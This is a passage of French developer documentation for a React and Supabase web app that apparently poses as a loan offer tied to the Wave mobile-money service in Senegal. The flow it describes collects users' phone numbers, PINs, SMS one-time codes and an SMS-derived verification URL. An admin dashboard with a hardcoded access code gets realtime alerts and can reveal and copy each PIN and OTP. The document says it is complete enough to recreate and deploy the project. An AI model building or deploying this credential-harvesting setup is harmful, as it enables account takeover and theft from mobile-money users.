  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [showAdminAuth, setShowAdminAuth] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [userPhone, setUserPhone] = useState('');

  // Vérifier URL pour mode admin
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('admin') === 'true') {
      setShowAdminAuth(true);
    }
  }, []);

  // Vérifier session utilisateur existante
  useEffect(() => {
    const savedPhone = sessionStorage.getItem('user_phone');
    if (savedPhone) {
      setUserPhone(savedPhone);
      setIsAuthenticated(true);
    }
  }, []);

  // Handlers de navigation
  const handleGetStarted = () => {
    setShowLoanApplication(true);
  };

  const handleLoanComplete = () => {
    setShowLoanApplication(false);
    setShowAuth(true);
  };

  const handleAuthSuccess = (phone: string) => {
    setUserPhone(phone);
    setIsAuthenticated(true);
    setShowAuth(false);
  };

  const handleLogout = () => {
    sessionStorage.clear();
    setIsAuthenticated(false);
    setUserPhone('');
  };

  const handleAdminSuccess = () => {
    setIsAdmin(true);
    setShowAdminAuth(false);
  };

  const handleAdminLogout = () => {
    setIsAdmin(false);
    setShowAdminAuth(true);
  };

  // Rendu conditionnel (routage)
  return (
    <>
      {/* Admin */}
      {showAdminAuth && !isAdmin && (
        <AdminAuth onSuccess={handleAdminSuccess} />
      )}

      {isAdmin && (
        <AdminDashboard onLogout={handleAdminLogout} />
      )}

      {/* Utilisateur */}
      {!showAdminAuth && !isAdmin && (
        <>
          {!showLoanApplication && !showAuth && !isAuthenticated && (
            <LandingPage onGetStarted={handleGetStarted} />
          )}

          {showLoanApplication && (
            <LoanApplication onComplete={handleLoanComplete} />
          )}

          {showAuth && (
            <AuthScreen onSuccess={handleAuthSuccess} />
          )}

          {isAuthenticated && (
            <Dashboard
              userPhone={userPhone}
              onLogout={handleLogout}
            />
          )}
        </>
      )}

      {/* Toast Container */}
      <ToastContainer />
    </>
  );
}

export default App;
```

---

## 13. AUTHENTIFICATION ET AUTORISATION

### 13.1 Flux utilisateur complet

```
1. LandingPage
   ↓ [Clic "Demander mon prêt"]

2. LoanApplication (7 étapes)
   - welcome
   - project-type (Commerce/Immobilier/Particulier)
   - amount (50K - 2M XOF)
   - duration (2/3/4 mois)
   - eligibility
   - transaction-check
   - personal (nom, téléphone, email)
   - activating (audio 15s)
   - success
   ↓ [Complétion]

3. AuthScreen (5 étapes)
   - account-type (Standard/Business)
   - phone (validation 10 chiffres)
   - pin (4 chiffres, max 3 tentatives)
   - verification (OTP SMS, max 3 tentatives)
   - url-verification (extraction automatique)
   ↓ [Vérification admin toutes les 3s]

4. [Admin valide] → Dashboard utilisateur
   [Admin rejette] → Message d'erreur
```

### 13.2 Flux admin

```
1. Accès /?admin=true
   ↓

2. AdminAuth
   - Interface Matrix
   - Code: 'Darck_44667' ou '44667'
   - Session 24h persistante
   ↓ [Login réussi]

3. AdminDashboard
   - Vue temps réel des inscriptions
   - Actions: Valider/Rejeter/Supprimer
   - Statistiques visiteurs
   - Notifications desktop
   - Auto-refresh 30s
```

### 13.3 Sécurité

**Côté utilisateur**:
- Limites de tentatives (PIN: 3, SMS: 3)
- Validation formats (téléphone, PIN, OTP)
- Vérification temps réel du statut

**Côté admin**:
- Session cryptée (base64) dans localStorage
- Cookies httpOnly, secure, samesite=strict
- Expiration automatique (24h)
- Renouvellement auto si < 1h restante

**Base de données**:
- Row Level Security (RLS) activé
- Policies SELECT/INSERT/UPDATE
- Pas de DELETE public
- Indexes pour performance

---

## 14. FONCTIONNALITÉS TEMPS RÉEL

### 14.1 Supabase Realtime Subscriptions

**Configuration dans AdminDashboard**:

```typescript
useEffect(() => {
  const channel = supabase
    .channel('user_registrations_changes')
    .on(
      'postgres_changes',
      {
        event: '*',  // INSERT, UPDATE, DELETE
        schema: 'public',
        table: 'user_registrations'
      },
      (payload) => {
        console.log('Realtime event:', payload);

        if (payload.eventType === 'INSERT') {
          // Nouvelle inscription
          setRegistrations(prev => [payload.new, ...prev]);
          playNotificationSound();
          showDesktopNotification(payload.new);
        } else if (payload.eventType === 'UPDATE') {
          // Mise à jour inscription
          setRegistrations(prev =>
            prev.map(r => r.id === payload.new.id ? payload.new : r)
          );
        } else if (payload.eventType === 'DELETE') {
          // Suppression inscription
          setRegistrations(prev =>
            prev.filter(r => r.id !== payload.old.id)
          );
        }
      }
    )
    .subscribe((status) => {
      console.log('Subscription status:', status);
    });

  return () => {
    supabase.removeChannel(channel);
  };
}, []);
```

### 14.2 Polling automatique

**Refresh toutes les 30 secondes**:

```typescript
useEffect(() => {
  const interval = setInterval(() => {
    loadRegistrations();
    loadStats();
  }, 30000);  // 30s

  return () => clearInterval(interval);
}, []);
```

### 14.3 Vérification du statut utilisateur

**Toutes les 3 secondes pendant url-verification**:

```typescript
useEffect(() => {
  if (currentStep !== 'url-verification') return;

  const interval = setInterval(async () => {
    const { data } = await supabase
      .from('user_registrations')
      .select('status')
      .eq('id', registrationId)
      .single();

    if (data?.status === 'verified') {
      clearInterval(interval);
      onSuccess();
    } else if (data?.status === 'rejected') {
      clearInterval(interval);
      toast.error('Demande rejetée');
    }
  }, 3000);  // 3s

  return () => clearInterval(interval);
}, [currentStep]);
```

---

## 15. GESTION DES NOTIFICATIONS

### 15.1 Notifications Desktop

**Demande de permission**:

```typescript
useEffect(() => {
  if ('Notification' in window && Notification.permission === 'default') {
    Notification.requestPermission();
  }
}, []);
```

**Notification de nouvelle inscription**:

```typescript
const showDesktopNotification = (registration: UserRegistration) => {
  if (Notification.permission !== 'granted') return;

  const notification = new Notification('Nouvelle inscription', {
    body: `Téléphone: ${registration.phone}\nType: ${registration.account_type}`,
    icon: '/icon.png',
    badge: '/badge.png',
    requireInteraction: true,
    tag: `registration-${registration.id}`,
    data: { registrationId: registration.id }
  });

  notification.onclick = () => {
    window.focus();
    // Scroll vers l'inscription
    document.getElementById(`reg-${registration.id}`)?.scrollIntoView();
  };
};
```

### 15.2 Sons de notification

```typescript
const playNotificationSound = () => {
  try {
    const audio = new Audio('/audio/notification.mp3');
    audio.volume = 0.7;
    audio.play();
  } catch (error) {
    console.error('Error playing sound:', error);
  }
};
```

### 15.3 Toasts in-app

```typescript
// Success
toast.success('Inscription validée avec succès');

// Error
toast.error('Erreur lors de la validation');

// Warning
toast.warning('Attention: 3 tentatives restantes');

// Info
toast.info('Vérification en cours...');
```

---

## 16. SÉCURITÉ ET CONFIDENTIALITÉ

### 16.1 Fonctionnalités désactivées

**DeviceInfo (services/deviceInfo.ts)**:
```typescript
// Fonction désactivée - retourne valeurs anonymes
export const getDeviceInfo = (): DeviceInfo => {
  return {
    mac_address: 'DISABLED',
    device_id: 'DISABLED',
    ip_address: 'DISABLED',
    country: 'DISABLED',
    browser: 'DISABLED',
    browser_version: 'DISABLED',
    os: 'DISABLED',
    os_version: 'DISABLED',
    screen_resolution: 'DISABLED',
    timezone: 'DISABLED',
    language: 'DISABLED',
    user_agent: 'DISABLED'
  };
};
```

**WaveAPI (services/waveApi.ts)**:
```typescript
// API désactivée pour confidentialité
export const waveApi = {
  login: () => Promise.reject('API désactivée'),
  sendSms: () => Promise.reject('API désactivée'),
  // ... autres méthodes désactivées
};
```

### 16.2 Headers de sécurité (netlify.toml)

```toml
X-Frame-Options = "DENY"
X-Content-Type-Options = "nosniff"
X-XSS-Protection = "1; mode=block"
Referrer-Policy = "strict-origin-when-cross-origin"
Content-Security-Policy = "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; ..."
```

### 16.3 Protection des données sensibles

**Masquage par défaut**:
```typescript
const [showPin, setShowPin] = useState(false);
const [showOtp, setShowOtp] = useState(false);

// Affichage
{showPin ? registration.pin : '****'}
{showOtp ? registration.last_verification_code : '****'}
```

**Copie sécurisée**:
```typescript
const copyToClipboard = async (text: string) => {
  try {
    await navigator.clipboard.writeText(text);
    toast.success('Copié !');
  } catch (error) {
    toast.error('Erreur de copie');
  }
};
```

---

## 17. DÉPLOIEMENT

### 17.1 Prérequis

```bash
# Node.js et npm
node --version  # v18+
npm --version   # v9+

# Git
git --version

# Compte Netlify
# Compte Supabase
```

### 17.2 Configuration Supabase

1. **Créer un projet Supabase**
   ```
   https://supabase.com/dashboard
   Créer nouveau projet
   ```

2. **Exécuter les migrations**
   ```bash
   # Installer Supabase CLI
   npm install -g supabase

   # Login
   supabase login

   # Lier le projet
   supabase link --project-ref <project-id>

   # Appliquer les migrations
   supabase db push
   ```

3. **Activer Realtime**
   ```sql
   -- Dans SQL Editor
   ALTER PUBLICATION supabase_realtime ADD TABLE user_registrations;
   ```

4. **Configurer RLS**
   ```
   Voir section "Base de données" pour les policies
   ```

### 17.3 Déploiement Netlify

1. **Via Git**
   ```bash
   # Créer repo GitHub
   git init
   git add .
   git commit -m "Initial commit"
   git remote add origin <repo-url>
   git push -u origin main

   # Sur Netlify
   - New site from Git
   - Sélectionner le repo
   - Build command: npm run build
   - Publish directory: dist
   - Add environment variables (VITE_SUPABASE_URL, VITE_SUPABASE_ANON_KEY)
   ```

2. **Via Netlify CLI**
   ```bash
   # Installer Netlify CLI
   npm install -g netlify-cli

   # Login
   netlify login

   # Init
   netlify init

   # Deploy
   netlify deploy --prod
   ```

### 17.4 Variables d'environnement

**Dans Netlify Dashboard**:
```
Site settings → Environment variables → Add variables

VITE_SUPABASE_URL=https://xxxx.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGci...
```

---

## 18. GUIDE DE DÉVELOPPEMENT

### 18.1 Installation

```bash
# Cloner le projet
git clone <repo-url>
cd Wave-app-auto-senegal

# Installer dépendances
npm install

# Copier .env.example
cp .env.example .env

# Éditer .env avec vos credentials Supabase
nano .env
```

### 18.2 Commandes de développement

```bash
# Démarrer serveur dev
npm run dev
# → http://localhost:5173

# Build production
npm run build

# Preview build
npm run preview

# Linter
npm run lint

# Type check
npm run type-check
```

### 18.3 Structure d'une nouvelle page

```typescript
// src/components/MaNouvellePage.tsx
import { useState, useEffect } from 'react';
import { supabase } from '../lib/supabase';
import { toast } from '../lib/toast';
import { recordVisit } from '../lib/visitors';

interface MaNouvellePageProps {
  onComplete?: () => void;
}

const MaNouvellePage: React.FC<MaNouvellePageProps> = ({ onComplete }) => {
  // États
  const [loading, setLoading] = useState(false);

  // Track visite
  useEffect(() => {
    recordVisit('ma-nouvelle-page');
  }, []);

  // Logique métier
  const handleSubmit = async () => {
    setLoading(true);
    try {
      // ...
      toast.success('Succès !');
      onComplete?.();
    } catch (error) {
      toast.error('Erreur');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
      {/* Contenu */}
    </div>
  );
};

export default MaNouvellePage;
```

### 18.4 Ajouter une table Supabase

```sql
-- 1. Créer la migration
-- supabase/migrations/20260315000000_add_new_table.sql

CREATE TABLE ma_nouvelle_table (
    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    nom text NOT NULL,
    created_at timestamptz DEFAULT now()
);

-- 2. Index
CREATE INDEX idx_ma_nouvelle_table_nom ON ma_nouvelle_table(nom);

-- 3. RLS
ALTER TABLE ma_nouvelle_table ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public can view" ON ma_nouvelle_table
    FOR SELECT USING (true);

-- 4. Appliquer
-- supabase db push
```

### 18.5 Bonnes pratiques

**TypeScript**:
```typescript
// Toujours typer les props
interface MyComponentProps {
  title: string;
  count?: number;  // Optionnel
}

// Typer les states
const [user, setUser] = useState<UserRegistration | null>(null);

// Typer les fonctions async
const loadData = async (): Promise<void> => {
  // ...
};
```

**React**:
```typescript
// Cleanup des intervals/subscriptions
useEffect(() => {
  const interval = setInterval(() => {}, 1000);
  return () => clearInterval(interval);
}, []);

// Dependencies correctes
useEffect(() => {
  loadData();
}, [dependency1, dependency2]);  // Liste toutes les dépendances
```

**Supabase**:
```typescript
// Toujours gérer les erreurs
const { data, error } = await supabase.from('table').select();
if (error) {
  console.error('Error:', error);
  toast.error('Erreur de chargement');
  return;
}

// Vérifier data avant utilisation
if (data && data.length > 0) {
  // ...
}
```

---

## 19. DIAGRAMMES ET FLUX

### 19.1 Diagramme d'architecture

```
┌─────────────────────────────────────────────────────────────┐
│                         FRONTEND                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  LandingPage │  │LoanApplication│  │  AuthScreen  │      │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘      │
│         │                 │                  │              │
│         └─────────────────┴──────────────────┘              │
│                           │                                 │
│                  ┌────────▼────────┐                        │
│                  │   App.tsx       │                        │
│                  │   (Routing)     │                        │
│                  └────────┬────────┘                        │
│                           │                                 │
│         ┌─────────────────┴─────────────────┐               │
│         │                                   │               │
│    ┌────▼────┐                      ┌───────▼──────┐        │
│    │Dashboard│                      │AdminDashboard│        │
│    └─────────┘                      └──────────────┘        │
└─────────────────────────┬───────────────────────────────────┘
                          │
                  ┌───────▼────────┐
                  │ Supabase Client│
                  └───────┬────────┘
                          │
┌─────────────────────────▼───────────────────────────────────┐
│                      SUPABASE BACKEND                       │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  PostgreSQL  │  │   Realtime   │  │     Auth     │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│                                                             │
│  Tables:                                                    │
│  - user_registrations                                       │
│  - admin_notifications                                      │
│  - realtime_visitors                                        │
│  - webhook_logs                                             │
│  - user_device_details                                      │
└─────────────────────────────────────────────────────────────┘
```

### 19.2 Flux de données

```
USER ACTION
    ↓
COMPONENT
    ↓
SERVICE/HOOK
    ↓
SUPABASE CLIENT
    ↓
[Network Request]
    ↓
SUPABASE BACKEND
    ↓
POSTGRESQL
    ↓
[Response]
    ↓
COMPONENT UPDATE
    ↓
UI RE-RENDER
```

### 19.3 Cycle de vie d'une inscription

```
1. USER fills LoanApplication
   → Données stockées localement (state)

2. USER submits → Navigate to AuthScreen

3. AuthScreen - Step 1: Account Type
   → User selects Standard/Business

4. AuthScreen - Step 2: Phone
   → Insert in user_registrations (status: pending)

5. AuthScreen - Step 3: PIN
   → Update user_registrations.pin

6. AuthScreen - Step 4: OTP
   → Update user_registrations.last_verification_code
   → Status → pending_validation

7. AuthScreen - Step 5: URL
   → Update user_registrations.verification_url
   → Polling check status every 3s

8. ADMIN validates in AdminDashboard
   → Update status → verified

9. USER polling detects status change
   → Navigate to Dashboard
```

---

## 20. RÉSUMÉ POUR DÉVELOPPEUR

### 20.1 Technologies clés

- **Frontend**: React 18 + TypeScript + Vite
- **Styling**: TailwindCSS
- **Backend**: Supabase (PostgreSQL + Realtime)
- **Déploiement**: Netlify

### 20.2 Pages principales

1. **LandingPage**: Accueil publique
2. **LoanApplication**: Formulaire 7 étapes
3. **AuthScreen**: Authentification 5 étapes
4. **Dashboard**: Espace utilisateur
5. **AdminAuth**: Login admin (Matrix style)
6. **AdminDashboard**: Gestion temps réel

### 20.3 Tables essentielles

- **user_registrations**: Inscriptions utilisateurs
- **admin_notifications**: Notifications admin
- **realtime_visitors**: Tracking visiteurs

### 20.4 Sécurité

- RLS activé sur toutes les tables
- Session admin 24h cryptée
- Limites de tentatives (PIN: 3, SMS: 3)
- Headers sécurité CSP, XSS, CORS

### 20.5 Real-time

- Supabase subscriptions sur user_registrations
- Polling 3s pour vérification statut
- Polling 30s pour refresh admin
- Notifications desktop

### 20.6 Points d'attention

- **DeviceInfo et WaveAPI désactivés** (confidentialité)
- Pas de React Router (routage par état)
- Audio pour activation et vérification
- Extraction automatique d'URL depuis SMS

---

## FIN DE LA DOCUMENTATION

Cette documentation complète permet à un développeur de:
✅ Comprendre l'architecture complète du projet
✅ Recréer le projet de zéro
✅ Ajouter de nouvelles fonctionnalités
✅ Déployer en production
✅ Maintenir et déboguer

Pour toute question: voir les fichiers source ou la documentation API Supabase.

